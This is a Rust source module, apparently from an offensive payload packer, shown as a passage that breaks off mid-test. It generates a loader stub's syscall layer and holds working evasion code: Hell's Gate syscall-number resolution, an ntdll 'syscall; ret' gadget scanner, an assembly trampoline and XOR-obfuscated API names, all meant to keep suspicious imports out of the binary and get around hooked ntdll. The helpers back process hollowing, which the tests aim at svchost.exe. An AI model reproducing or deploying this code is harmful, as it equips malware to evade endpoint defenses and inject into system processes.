//! Syscall layer configuration and stub rendering.
//!
//! `build.stub.syscalls` (YAML) selects how the generated stub talks to the
//! kernel. It is a *loader* concern, not a pipeline technique: it changes how the
//! stub
//! invokes primitives, not how the payload runs. Two modes exist:
//!
//! - [`SyscallsMode::None`]: the technique fragments call the same `nt_*`
//!   helpers, but the helpers map to the plain Win32 APIs.
//! - [`SyscallsMode::Indirect`]: the helpers resolve SSNs at runtime with
//!   Hell's Gate and invoke the kernel through the `syscall; ret` gadget in
//!   ntdll's `.text`, so the suspicious Win32 imports never appear in the IAT.
//!
//! The fragment contract is: technique fragments always call the `nt_*`
//! helpers (never the Win32 APIs directly), and the helper implementation
//! depends on the mode. A fragment never knows whether syscalls are active.
//!
//! The SSN table only contains the functions the active techniques need:
//! `TechniqueDef::syscalls` lists each technique's Nt* requirements and the
//! union (in the canonical [`NT_FUNCTIONS`] order) is what the stub resolves.

use std::collections::BTreeSet;

use serde::{Deserialize, Serialize};

use crate::error::{PackerError, Result};
use crate::techniques::RuntimeStep;

use super::obfuscation::StringsConfig;

/// Raw `build.stub.syscalls` YAML block, before semantic validation.
///
/// `mode` and `resolver` are kept as plain strings here so that
/// [`SyscallsConfig::from_yaml`] can report clear errors for invalid values
/// instead of a generic deserialization message.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct YamlSyscallsConfig {
    /// Syscall mode (`none` or `indirect`).
    #[serde(default = "default_mode")]
    pub mode: String,

    /// SSN resolver (`hells_gate`; `tartarus_gate` arrives in phase 6b).
    #[serde(default = "default_resolver")]
    pub resolver: String,
}

fn default_mode() -> String {
    "none".to_string()
}

fn default_resolver() -> String {
    "hells_gate".to_string()
}

/// How the stub invokes the kernel.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SyscallsMode {
    /// Plain Win32 calls; the helpers wrap the Win32 APIs directly.
    None,
    /// Indirect syscalls with runtime SSN resolution.
    Indirect,
}

impl SyscallsMode {
    /// Lowercase label used in the build summary.
    pub fn label(self) -> &'static str {
        match self {
            SyscallsMode::None => "none",
            SyscallsMode::Indirect => "indirect",
        }
    }
}

/// SSN resolution strategy (only Hell's Gate exists in phase 6a).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Resolver {
    /// Hell's Gate: read the SSN from the Nt* stub prologue in ntdll.
    HellsGate,
}

impl Resolver {
    /// Lowercase label used in the verbose build output.
    pub fn label(self) -> &'static str {
        match self {
            Resolver::HellsGate => "hells_gate",
        }
    }
}

/// Resolved syscall-layer configuration.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SyscallsConfig {
    /// How the stub invokes the kernel.
    pub mode: SyscallsMode,
    /// How the SSNs are resolved when the mode is `indirect`.
    pub resolver: Resolver,
}

impl Default for SyscallsConfig {
    fn default() -> Self {
        Self {
            mode: SyscallsMode::None,
            resolver: Resolver::HellsGate,
        }
    }
}

impl SyscallsConfig {
    /// Resolves the syscall config from the (optional) YAML block.
    ///
    /// `None` means the defaults (`mode: none`, `resolver: hells_gate`). An
    /// unknown mode or resolver is a validation error with a clear message.
    pub fn from_yaml(yaml: Option<&YamlSyscallsConfig>) -> Result<Self> {
        let Some(yaml) = yaml else {
            return Ok(Self::default());
        };

        let mode = match yaml.mode.as_str() {
            "none" => SyscallsMode::None,
            "indirect" => SyscallsMode::Indirect,
            other => {
                return Err(PackerError::Validation(format!(
                    "invalid build.stub.syscalls.mode '{other}': expected 'none' or 'indirect'"
                )));
            }
        };

        let resolver = match yaml.resolver.as_str() {
            "hells_gate" => Resolver::HellsGate,
            other => {
                return Err(PackerError::Validation(format!(
                    "invalid build.stub.syscalls.resolver '{other}': expected 'hells_gate' \
                     (tartarus_gate arrives in phase 6b)"
                )));
            }
        };

        Ok(Self { mode, resolver })
    }
}

/// One Nt* function the stub can invoke through the syscall layer.
struct NtFunction {
    /// Export name in ntdll (obfuscated with [`StringsConfig`] at render time).
    name: &'static str,
    /// Field of the generated `SsnTable` holding this function's SSN.
    table_field: &'static str,
    /// Name of the generated helper the technique fragments call.
    helper_name: &'static str,
    /// Helper body for `mode: none` (direct Win32 call).
    helper_none: &'static str,
    /// Helper body for `mode: indirect` (syscall through the gadget).
    helper_indirect: &'static str,
}

// --- Generated helper bodies -------------------------------------------------
//
// Each helper documents its Nt* signature in a comment (comments never reach
// the binary). The bodies are plain text injected into the generated stub;
// see the fragment contract in the module docs above.

/// `nt_alloc_vm`, mode none: VirtualAllocEx mapped to an NTSTATUS.
const ALLOC_VM_NONE: &str = r#"    /// NtAllocateVirtualMemory(ProcessHandle, &BaseAddress, ZeroBits,
    /// &RegionSize, AllocationType, Protect). None mode: VirtualAllocEx with
    /// the result mapped to an NTSTATUS. The actual base comes back through
    /// `base`, the actual size through `size`.
    pub fn nt_alloc_vm(
        process: HANDLE,
        base: *mut *mut core::ffi::c_void,
        _zero_bits: usize,
        size: *mut usize,
        alloc_type: u32,
        protect: u32,
    ) -> i32 {
        unsafe {
            let requested = if (*base).is_null() {
                None
            } else {
                Some(*base as *const core::ffi::c_void)
            };
            let address = VirtualAllocEx(
                process,
                requested,
                *size,
                VIRTUAL_ALLOCATION_TYPE(alloc_type),
                PAGE_PROTECTION_FLAGS(protect),
            );
            if address.is_null() {
                return STATUS_UNSUCCESSFUL;
            }
            *base = address;
            STATUS_SUCCESS
        }
    }
"#;

/// `nt_alloc_vm`, mode indirect: syscall with the resolved SSN.
const ALLOC_VM_INDIRECT: &str = r#"    /// NtAllocateVirtualMemory(ProcessHandle, &BaseAddress, ZeroBits,
    /// &RegionSize, AllocationType, Protect). BaseAddress/RegionSize are
    /// in-out pointers: the actual base/size come back through them.
    pub fn nt_alloc_vm(
        process: HANDLE,
        base: *mut *mut core::ffi::c_void,
        zero_bits: usize,
        size: *mut usize,
        alloc_type: u32,
        protect: u32,
    ) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                process.0 as usize,
                base as usize,
                zero_bits,
                size as usize,
                alloc_type as usize,
                protect as usize,
                ssns.alloc_vm,
                *gadget,
            )
        }
    }
"#;

/// `nt_write_vm`, mode none.
const WRITE_VM_NONE: &str = r#"    /// NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer,
    /// NumberOfBytesToWrite, &NumberOfBytesWritten). None mode:
    /// WriteProcessMemory mapped to an NTSTATUS.
    pub fn nt_write_vm(
        process: HANDLE,
        base: *const core::ffi::c_void,
        buffer: *const core::ffi::c_void,
        size: usize,
        written: *mut usize,
    ) -> i32 {
        unsafe {
            match WriteProcessMemory(process, base, buffer, size, Some(written)) {
                Ok(()) => STATUS_SUCCESS,
                Err(_) => STATUS_UNSUCCESSFUL,
            }
        }
    }
"#;

/// `nt_write_vm`, mode indirect.
const WRITE_VM_INDIRECT: &str = r#"    /// NtWriteVirtualMemory(ProcessHandle, BaseAddress, Buffer,
    /// NumberOfBytesToWrite, &NumberOfBytesWritten).
    pub fn nt_write_vm(
        process: HANDLE,
        base: *const core::ffi::c_void,
        buffer: *const core::ffi::c_void,
        size: usize,
        written: *mut usize,
    ) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                process.0 as usize,
                base as usize,
                buffer as usize,
                size,
                written as usize,
                0,
                ssns.write_vm,
                *gadget,
            )
        }
    }
"#;

/// `nt_read_vm`, mode none.
const READ_VM_NONE: &str = r#"    /// NtReadVirtualMemory(ProcessHandle, BaseAddress, Buffer,
    /// NumberOfBytesToRead, &NumberOfBytesRead). None mode: ReadProcessMemory
    /// mapped to an NTSTATUS.
    pub fn nt_read_vm(
        process: HANDLE,
        base: *const core::ffi::c_void,
        buffer: *mut core::ffi::c_void,
        size: usize,
        read: *mut usize,
    ) -> i32 {
        unsafe {
            match ReadProcessMemory(process, base, buffer, size, Some(read)) {
                Ok(()) => STATUS_SUCCESS,
                Err(_) => STATUS_UNSUCCESSFUL,
            }
        }
    }
"#;

/// `nt_read_vm`, mode indirect.
const READ_VM_INDIRECT: &str = r#"    /// NtReadVirtualMemory(ProcessHandle, BaseAddress, Buffer,
    /// NumberOfBytesToRead, &NumberOfBytesRead).
    pub fn nt_read_vm(
        process: HANDLE,
        base: *const core::ffi::c_void,
        buffer: *mut core::ffi::c_void,
        size: usize,
        read: *mut usize,
    ) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                process.0 as usize,
                base as usize,
                buffer as usize,
                size,
                read as usize,
                0,
                ssns.read_vm,
                *gadget,
            )
        }
    }
"#;

/// `nt_resume_thread`, mode none.
const RESUME_THREAD_NONE: &str = r#"    /// NtResumeThread(ThreadHandle, &PreviousSuspendCount). None mode:
    /// ResumeThread mapped to an NTSTATUS.
    pub fn nt_resume_thread(thread: HANDLE, previous: *mut u32) -> i32 {
        unsafe {
            let count = ResumeThread(thread);
            if count == u32::MAX {
                return STATUS_UNSUCCESSFUL;
            }
            if !previous.is_null() {
                *previous = count;
            }
            STATUS_SUCCESS
        }
    }
"#;

/// `nt_resume_thread`, mode indirect.
const RESUME_THREAD_INDIRECT: &str = r#"    /// NtResumeThread(ThreadHandle, &PreviousSuspendCount).
    pub fn nt_resume_thread(thread: HANDLE, previous: *mut u32) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                thread.0 as usize,
                previous as usize,
                0,
                0,
                0,
                0,
                ssns.resume_thread,
                *gadget,
            )
        }
    }
"#;

/// `nt_unmap_view`, mode none: windows-rs does not declare
/// `NtUnmapViewOfSection`, so it is resolved dynamically (as before phase 6a).
/// `$NTDLL_DEF$` / `$UNMAP_FUNC_DEF$` are substituted by the renderer with
/// runtime-reconstructed (obfuscated) strings.
const UNMAP_VIEW_NONE: &str = r#"    /// Signature of the ntdll export resolved dynamically in none mode.
    type UnmapViewFn = unsafe extern "system" fn(HANDLE, *const core::ffi::c_void) -> i32;

    /// NtUnmapViewOfSection(ProcessHandle, BaseAddress). None mode: resolve
    /// the export dynamically (windows-rs does not declare it) and call it.
    pub fn nt_unmap_view(process: HANDLE, base: *mut core::ffi::c_void) -> i32 {
        let Ok(ntdll) = std::ffi::CString::new($NTDLL_DEF$) else {
            return STATUS_UNSUCCESSFUL;
        };
        let Ok(unmap) = std::ffi::CString::new($UNMAP_FUNC_DEF$) else {
            return STATUS_UNSUCCESSFUL;
        };
        let module = match unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) } {
            Ok(module) => module,
            Err(_) => return STATUS_UNSUCCESSFUL,
        };
        let Some(address) =
            (unsafe { GetProcAddress(module, PCSTR(unmap.as_ptr() as *const u8)) })
        else {
            return STATUS_UNSUCCESSFUL;
        };
        let unmap: UnmapViewFn = unsafe { std::mem::transmute(address) };
        unsafe { unmap(process, base) }
    }
"#;

/// `nt_unmap_view`, mode indirect.
const UNMAP_VIEW_INDIRECT: &str = r#"    /// NtUnmapViewOfSection(ProcessHandle, BaseAddress).
    pub fn nt_unmap_view(process: HANDLE, base: *mut core::ffi::c_void) -> i32 {
        let Some(ssns) = SSNS.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        let Some(gadget) = GADGET.get() else {
            return STATUS_UNSUCCESSFUL;
        };
        unsafe {
            nt_invoke(
                process.0 as usize,
                base as usize,
                0,
                0,
                0,
                0,
                ssns.unmap_view,
                *gadget,
            )
        }
    }
"#;

/// Every Nt* function the stub can invoke, in canonical (rendering) order.
const NT_FUNCTIONS: &[NtFunction] = &[
    NtFunction {
        name: "NtAllocateVirtualMemory",
        table_field: "alloc_vm",
        helper_name: "nt_alloc_vm",
        helper_none: ALLOC_VM_NONE,
        helper_indirect: ALLOC_VM_INDIRECT,
    },
    NtFunction {
        name: "NtWriteVirtualMemory",
        table_field: "write_vm",
        helper_name: "nt_write_vm",
        helper_none: WRITE_VM_NONE,
        helper_indirect: WRITE_VM_INDIRECT,
    },
    NtFunction {
        name: "NtReadVirtualMemory",
        table_field: "read_vm",
        helper_name: "nt_read_vm",
        helper_none: READ_VM_NONE,
        helper_indirect: READ_VM_INDIRECT,
    },
    NtFunction {
        name: "NtResumeThread",
        table_field: "resume_thread",
        helper_name: "nt_resume_thread",
        helper_none: RESUME_THREAD_NONE,
        helper_indirect: RESUME_THREAD_INDIRECT,
    },
    NtFunction {
        name: "NtUnmapViewOfSection",
        table_field: "unmap_view",
        helper_name: "nt_unmap_view",
        helper_none: UNMAP_VIEW_NONE,
        helper_indirect: UNMAP_VIEW_INDIRECT,
    },
];

/// The Nt* function names the active techniques need, deduplicated and in the
/// canonical [`NT_FUNCTIONS`] order.
///
/// Techniques not in the pipeline contribute nothing, so their SSNs are never
/// resolved (and their names never emitted) — less work at startup and fewer
/// strings in the binary.
pub fn required(pipeline: &[RuntimeStep]) -> Vec<&'static str> {
    required_functions(pipeline)
        .into_iter()
        .map(|f| f.name)
        .collect()
}

/// The full [`NtFunction`] records the active techniques need.
fn required_functions(pipeline: &[RuntimeStep]) -> Vec<&'static NtFunction> {
    let mut needed: BTreeSet<&str> = BTreeSet::new();
    for step in pipeline {
        if let Some(def) = crate::techniques::find(step.name()) {
            needed.extend(def.syscalls.iter().copied());
        }
    }
    NT_FUNCTIONS
        .iter()
        .filter(|f| needed.contains(f.name))
        .collect()
}

/// Renders the `$SYSCALLS_BLOCK$` fragment for the given pipeline.
///
/// - No active technique needs syscalls: a no-op `init_syscalls`.
/// - `mode: none`: the `nt_*` helpers mapped to the direct Win32 APIs.
/// - `mode: indirect`: the full Hell's Gate layer (SSN table, resolver, ASM
///   trampoline, gadget scanner) plus the helpers.
pub fn render_block(
    config: &SyscallsConfig,
    pipeline: &[RuntimeStep],
    strings: &StringsConfig,
) -> String {
    let required = required_functions(pipeline);
    if required.is_empty() {
        return assemble(
            "// --- Syscall layer ---\n// No active technique uses NT syscalls, so the layer is a no-op.",
            EMPTY_BODY,
            &["init_syscalls"],
        );
    }

    let (header, body) = match config.mode {
        SyscallsMode::None => (
            "// --- Syscall layer (build.stub.syscalls.mode = none) ---\n// Direct Win32 calls: the \
             fragments always call the nt_* helpers, which map to\n// the Win32 APIs below. The \
             DLL/function names are rebuilt at runtime from\n// obfuscated bytes injected by the \
             packer.",
            render_none(&required, strings),
        ),
        SyscallsMode::Indirect => (
            "// --- Syscall layer (build.stub.syscalls.mode = indirect, resolver = hells_gate) ---\n// \
             Indirect syscalls with Hell's Gate SSN resolution. The Nt* names are\n// rebuilt \
             at runtime from obfuscated bytes injected by the packer, so none\n// of them appears \
             in the binary. See docs/techniques/indirect_syscalls.md.",
            render_indirect(&required, strings),
        ),
    };

    let reexports: Vec<&str> = std::iter::once("init_syscalls")
        .chain(required.iter().map(|f| f.helper_name))
        .collect();
    assemble(header, &body, &reexports)
}

/// Wraps the rendered body in `mod syscalls { ... }` and re-exports the
/// helpers the fragments call through `crate::`.
fn assemble(header: &str, body: &str, reexports: &[&str]) -> String {
    let mut block = format!("{header}\nmod syscalls {{\n{body}}}\n");
    block.push_str(&format!("use syscalls::{{{}}};\n", reexports.join(", ")));
    block
}

/// The block when no technique in the pipeline needs syscalls.
const EMPTY_BODY: &str = r#"    /// Initializes the syscall layer. A no-op here: no technique needs it.
    pub fn init_syscalls() -> Result<(), String> {
        Ok(())
    }
"#;

/// Prelude shared by every `mode: none` block (imports + no-op init).
const NONE_PRELUDE: &str = r#"    use windows::core::PCSTR;
    use windows::Win32::Foundation::HANDLE;
    use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
    use windows::Win32::System::Memory::{
        VirtualAllocEx, PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE,
    };
    use windows::Win32::System::Threading::ResumeThread;

    const STATUS_SUCCESS: i32 = 0;
    /// Generic failure for a mapped Win32 call that has no real NTSTATUS.
    const STATUS_UNSUCCESSFUL: i32 = 0xC000_0001u32 as i32;

    /// Initializes the syscall layer. A no-op when syscalls are disabled.
    pub fn init_syscalls() -> Result<(), String> {
        Ok(())
    }
"#;

/// Prelude of the `mode: indirect` block: trampoline, SSN table, resolver and
/// gadget scanner. `$SSN_FIELDS$` / `$SSN_INIT$` / `$SSN_RESOLVE$` /
/// `$NTDLL_DEF$` are filled by [`render_indirect`].
const INDIRECT_PRELUDE: &str = r#"    use core::arch::global_asm;
    use std::sync::OnceLock;

    use windows::core::PCSTR;
    use windows::Win32::Foundation::{HANDLE, HMODULE};
    use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};

    const STATUS_SUCCESS: i32 = 0;
    /// Generic failure when the layer was not initialized before a call.
    const STATUS_UNSUCCESSFUL: i32 = 0xC000_0001u32 as i32;

    /// Invokes one NT syscall through the `syscall; ret` gadget in ntdll.
    ///
    /// Windows x64 ABI: arguments 1-4 arrive in rcx/rdx/r8/r9, every further
    /// argument on the caller's stack — after the return address and the
    /// 32-byte shadow space, the callee sees argument 5 at [rsp+40], 6 at
    /// [rsp+48], 7 at [rsp+56] and 8 at [rsp+64].
    ///
    /// The `syscall` instruction expects arguments 1-4 in the same registers,
    /// argument 1 *also* in r10, the SSN in eax, and arguments 5-6 at
    /// [rsp+8]/[rsp+16] (rsp points at the return address when the gadget
    /// runs). `nt_invoke` rearranges the frame accordingly and jumps into the
    /// gadget; the gadget's trailing `ret` pops our caller's return address
    /// and goes straight back to the Rust caller.
    extern "system" {
        fn nt_invoke(
            arg1: usize,
            arg2: usize,
            arg3: usize,
            arg4: usize,
            arg5: usize,
            arg6: usize,
            ssn: u32,
            gadget: usize,
        ) -> i32;
    }

    global_asm!(
        ".intel_syntax noprefix",
        ".global nt_invoke",
        "nt_invoke:",
        // Register args are already where the syscall wants them; only the
        // stack args (5/6) and the trailing SSN/gadget (7/8) need to move.
        "mov r10, rcx",        // r10 = arg1 (syscall argument convention)
        "mov rax, [rsp + 40]", // rax = arg5
        "mov [rsp + 8], rax",  // the syscall reads arg5 from [rsp+8]
        "mov rax, [rsp + 48]", // rax = arg6
        "mov [rsp + 16], rax", // the syscall reads arg6 from [rsp+16]
        "mov eax, [rsp + 56]", // eax = SSN
        "mov r11, [rsp + 64]", // r11 = gadget address (syscall; ret)
        "jmp r11",
    );

    /// SSNs resolved at startup by Hell's Gate. The packer emits exactly the
    /// fields the active techniques need.
    struct SsnTable {
$SSN_FIELDS$
    }

    static SSNS: OnceLock<SsnTable> = OnceLock::new();
    /// Address of the first `syscall; ret` gadget in ntdll's `.text`.
    static GADGET: OnceLock<usize> = OnceLock::new();

    /// Why the syscall layer failed to initialize.
    #[derive(Debug, thiserror::Error)]
    enum SyscallError {
        #[error("could not load the native API library")]
        NtdllNotFound,
        #[error("could not resolve '{0}'")]
        FunctionNotFound(String),
        #[error("ntdll appears hooked on '{0}': Hell's Gate cannot read its SSN (phase 6b, Tartarus Gate, will handle this)")]
        PatternMismatch(String),
        #[error("could not locate a syscall; ret gadget in ntdll")]
        GadgetNotFound,
        /// Reserved for helpers that wrap the NTSTATUS (later phases).
        #[error("syscall invocation failed (0x{0:08x})")]
        #[allow(dead_code)]
        InvocationFailed(i32),
    }

    /// Resolves every SSN the active techniques need and caches the gadget.
    /// The stub calls this once, before the techniques run.
    pub fn init_syscalls() -> Result<(), String> {
        let (table, gadget) = resolve_ssns().map_err(|e| e.to_string())?;
        let _ = SSNS.set(table);
        let _ = GADGET.set(gadget);
        Ok(())
    }

    /// Hell's Gate: reads each SSN out of the Nt* stub prologue in ntdll.
    fn resolve_ssns() -> Result<(SsnTable, usize), SyscallError> {
        let ntdll =
            std::ffi::CString::new($NTDLL_DEF$).map_err(|_| SyscallError::NtdllNotFound)?;
        let module = unsafe { GetModuleHandleA(PCSTR(ntdll.as_ptr() as *const u8)) }
            .map_err(|_| SyscallError::NtdllNotFound)?;

        let mut table = SsnTable {
$SSN_INIT$
        };
$SSN_RESOLVE$

        let gadget = find_gadget(module)?;
        Ok((table, gadget))
    }

    /// Resolves one function and reads its SSN from the stub prologue.
    fn resolve_ssn(module: HMODULE, name: &str) -> Result<u32, SyscallError> {
        let cname = std::ffi::CString::new(name)
            .map_err(|_| SyscallError::FunctionNotFound(name.to_string()))?;
        let address = unsafe { GetProcAddress(module, PCSTR(cname.as_ptr() as *const u8)) };
        let Some(address) = address else {
            return Err(SyscallError::FunctionNotFound(name.to_string()));
        };
        let prologue = unsafe { std::slice::from_raw_parts(address as *const u8, 8) };
        match parse_ssn(prologue) {
            Some(ssn) => Ok(ssn),
            None => Err(SyscallError::PatternMismatch(name.to_string())),
        }
    }

    /// Returns the SSN when `bytes` starts with the canonical prologue
    /// `4C 8B D1 B8 ?? ?? ?? ??` (`mov r10, rcx; mov eax, <SSN>`).
    /// Mirrors `engine::syscalls::parse_ssn_prologue` (unit-tested in the
    /// packer).
    fn parse_ssn(bytes: &[u8]) -> Option<u32> {
        let prologue = [0x4C, 0x8B, 0xD1, 0xB8];
        if bytes.len() < 8 || bytes[..4] != prologue {
            return None;
        }
        Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]))
    }

    /// Scans ntdll's `.text` section for the first `0F 05 C3` (syscall; ret).
    /// Mirrors `engine::syscalls::find_gadget_offset` (unit-tested in the
    /// packer).
    fn find_gadget(module: HMODULE) -> Result<usize, SyscallError> {
        let base = module.0 as usize;
        // ntdll is mapped at its preferred base, so RVAs are offsets from
        // `base`: walk the PE section table to find `.text` and scan it.
        let text = text_range(base).ok_or(SyscallError::GadgetNotFound)?;
        let bytes = unsafe { std::slice::from_raw_parts(text.0 as *const u8, text.1) };
        for (i, window) in bytes.windows(3).enumerate() {
            if window == [0x0F, 0x05, 0xC3] {
                return Ok(text.0 + i);
            }
        }
        Err(SyscallError::GadgetNotFound)
    }

    /// Returns the in-memory `[start, size)` of ntdll's `.text` section.
    fn text_range(base: usize) -> Option<(usize, usize)> {
        let dos = base as *const u8;
        if unsafe { *dos } != b'M' || unsafe { *dos.add(1) } != b'Z' {
            return None;
        }
        let e_lfanew = pe_u32(base, 0x3C)? as usize;
        // IMAGE_NT_HEADERS: Signature (4) + FileHeader (20) + OptionalHeader.
        // FileHeader.NumberOfSections is at offset 2, SizeOfOptionalHeader at
        // offset 16; the section table follows the optional header.
        let num_sections = pe_u16(base, e_lfanew.checked_add(4 + 2)?)? as usize;
        let opt_size = pe_u16(base, e_lfanew.checked_add(4 + 16)?)? as usize;
        let table = e_lfanew.checked_add(4 + 20)?.checked_add(opt_size as usize)?;
        for i in 0..num_sections {
            let s = table.checked_add(i * 40)?;
            let name = unsafe { std::slice::from_raw_parts((base + s) as *const u8, 8) };
            if &name[..5] == b".text" {
                let virtual_address = pe_u32(base, s + 12)? as usize;
                let virtual_size = pe_u32(base, s + 8)? as usize;
                let raw_size = pe_u32(base, s + 16)? as usize;
                return Some((base + virtual_address, virtual_size.max(raw_size)));
            }
        }
        None
    }

    /// Bounds-checked little-endian u16 read from ntdll's mapped image.
    fn pe_u16(base: usize, off: usize) -> Option<u16> {
        let p = base.checked_add(off)?;
        let s = unsafe { std::slice::from_raw_parts(p as *const u8, 2) };
        Some(u16::from_le_bytes([s[0], s[1]]))
    }

    /// Bounds-checked little-endian u32 read from ntdll's mapped image.
    fn pe_u32(base: usize, off: usize) -> Option<u32> {
        let p = base.checked_add(off)?;
        let s = unsafe { std::slice::from_raw_parts(p as *const u8, 4) };
        Some(u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
    }
"#;

/// Renders the `mode: none` body: the prelude plus the direct helpers for the
/// required functions.
fn render_none(required: &[&'static NtFunction], strings: &StringsConfig) -> String {
    let ntdll_def = strings
        .obfuscate("ntdll.dll")
        .render_stub_expr("ntdll_name");
    let unmap_def = strings
        .obfuscate("NtUnmapViewOfSection")
        .render_stub_expr("unmap_func");

    let mut out = String::from(NONE_PRELUDE);
    for f in required {
        out.push_str(f.helper_none);
        out.push('\n');
    }
    out.replace("$NTDLL_DEF$", &ntdll_def)
        .replace("$UNMAP_FUNC_DEF$", &unmap_def)
}

/// Renders the `mode: indirect` body: the prelude (with the SSN table fields,
/// initializers and resolution lines for the required functions) plus the
/// indirect helpers.
fn render_indirect(required: &[&'static NtFunction], strings: &StringsConfig) -> String {
    let ntdll_def = strings
        .obfuscate("ntdll.dll")
        .render_stub_expr("ntdll_name");

    let mut fields = String::new();
    let mut init = String::new();
    let mut resolve = String::new();
    let mut helpers = String::new();

    for f in required {
        fields.push_str(&format!("        {}: u32,\n", f.table_field));
        init.push_str(&format!("            {}: 0,\n", f.table_field));

        // The name is rebuilt at runtime from obfuscated bytes; the variable
        // name (e.g. `alloc_vm_name`) is not sensitive.
        let name_var = format!("{}_name", f.table_field);
        let name_def = strings.obfuscate(f.name).render_stub_expr(&name_var);
        resolve.push_str(&format!(
            "        table.{} = resolve_ssn(module, &{})?;\n",
            f.table_field, name_def
        ));

        helpers.push_str(f.helper_indirect);
        helpers.push('\n');
    }

    let mut out = INDIRECT_PRELUDE
        .replace("$SSN_FIELDS$", fields.trim_end())
        .replace("$SSN_INIT$", init.trim_end())
        .replace("$SSN_RESOLVE$", resolve.trim_end())
        .replace("$NTDLL_DEF$", &ntdll_def);
    out.push_str(&helpers);
    out
}

/// Extracts the SSN from a Hell's Gate stub prologue.
///
/// Returns `Some(ssn)` when `bytes` starts with the canonical prologue
/// `4C 8B D1 B8 ?? ?? ?? ??` (`mov r10, rcx; mov eax, <SSN>`), and `None`
/// otherwise (hooked or otherwise altered stub). This mirrors the resolver
/// embedded in the generated stub, so the parsing behavior is unit-tested
/// here instead of on a live ntdll.
#[cfg(test)]
pub fn parse_ssn_prologue(bytes: &[u8]) -> Option<u32> {
    const PROLOGUE: [u8; 4] = [0x4C, 0x8B, 0xD1, 0xB8]; // mov r10, rcx; mov eax, imm32
    if bytes.len() < 8 || bytes[..4] != PROLOGUE {
        return None;
    }
    Some(u32::from_le_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]))
}

/// Returns the offset of the first `0F 05 C3` (`syscall; ret`) gadget in
/// `bytes`, if any. Mirrors the generated stub's ntdll `.text` scanner, so
/// the gadget-matching behavior is unit-tested here.
#[cfg(test)]
pub fn find_gadget_offset(bytes: &[u8]) -> Option<usize> {
    const GADGET: [u8; 3] = [0x0F, 0x05, 0xC3]; // syscall; ret
    bytes.windows(3).position(|window| window == GADGET)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::obfuscation::{StringStrategy, StringsConfig};
    use crate::techniques::process_hollowing::Params;

    fn xor_config() -> StringsConfig {
        StringsConfig {
            strategy: StringStrategy::Xor,
            key: Some([0x5Au8; 32]),
        }
    }

    fn hollowing_pipeline() -> Vec<RuntimeStep> {
        vec![RuntimeStep::ProcessHollowing(Params {
            target: r"C:\Windows\System32\svchost.exe".to_string(),
        })]
    }

    fn reflective_pipeline() -> Vec<RuntimeStep> {
        vec![RuntimeStep::ReflectiveLoading(
            crate::techniques::reflective_loading::Params {},
        )]
    }

    fn indirect() -> SyscallsConfig {
        SyscallsConfig {
            mode: SyscallsMode::Indirect,
            resolver: Resolver::HellsGate,
        }
    }

    // --- configuration ---

    #[test]
    fn from_yaml_defaults_to_none_when_absent() {
        let config = SyscallsConfig::from_yaml(None).expect("defaults should be valid");
        assert_eq!(config.mode, SyscallsMode::None);
        assert_eq!(config.resolver, Resolver::HellsGate);
    }

    #[test]
    fn from_yaml_parses_indirect_mode() {
        let yaml = YamlSyscallsConfig {
            mode: "indirect".into(),
            resolver: "hells_gate".into(),
        };
        let config = SyscallsConfig::from_yaml(Some(&yaml)).expect("indirect should be valid");
        assert_eq!(config.mode, SyscallsMode::Indirect);
        assert_eq!(config.resolver, Resolver::HellsGate);
    }

    #[test]
    fn from_yaml_rejects_unknown_mode() {
        let yaml = YamlSyscallsConfig {
            mode: "direct".into(),
            resolver: "hells_gate".into(),
        };
        let err = SyscallsConfig::from_yaml(Some(&yaml)).expect_err("direct should fail");
        assert!(
            err.to_string().contains("build.stub.syscalls.mode"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn from_yaml_rejects_unknown_resolver() {
        let yaml = YamlSyscallsConfig {
            mode: "indirect".into(),
            resolver: "tartarus_gate".into(),
        };
        let err = SyscallsConfig::from_yaml(Some(&yaml)).expect_err("tartarus should fail");
        assert!(
            err.to_string().contains("build.stub.syscalls.resolver"),
            "unclear error: {err}"
        );
    }

    #[test]
    fn yaml_block_defaults_to_none_and_hells_gate() {
        let yaml: YamlSyscallsConfig = serde_yml::from_str("mode: indirect\n").expect("parse");
        assert_eq!(yaml.mode, "indirect");
        assert_eq!(yaml.resolver, "hells_gate");
    }

    // --- required functions ---

    #[test]
    fn required_lists_hollowing_functions_in_canonical_order() {
        let required = required(&hollowing_pipeline());
        assert_eq!(
            required,
            vec![
                "NtAllocateVirtualMemory",
                "NtWriteVirtualMemory",
                "NtReadVirtualMemory",
                "NtResumeThread",
                "NtUnmapViewOfSection",
            ]
        );
    }

    #[test]
    fn required_is_empty_when_no_technique_uses_syscalls() {
        assert!(required(&reflective_pipeline()).is_empty());
        assert!(required(&[]).is_empty());
    }

    #[test]
    fn required_deduplicates_across_the_pipeline() {
        // Two hollowing steps would be invalid config, but the union logic
